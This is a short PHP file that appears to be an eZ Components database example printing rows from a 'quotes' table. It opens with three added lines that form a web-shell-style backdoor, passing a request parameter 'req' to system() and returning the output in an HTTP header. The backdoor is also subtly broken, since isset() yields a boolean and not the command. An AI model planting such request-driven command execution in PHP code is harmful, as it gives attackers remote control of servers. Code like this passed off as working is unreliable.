<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

$db = ezcDbInstance::get();

$rows = $db->query( 'SELECT * FROM quotes' );

// Iterate over the rows and print the information from each result.
foreach( $rows as $row )
{
    print_r( $row );
}
?>
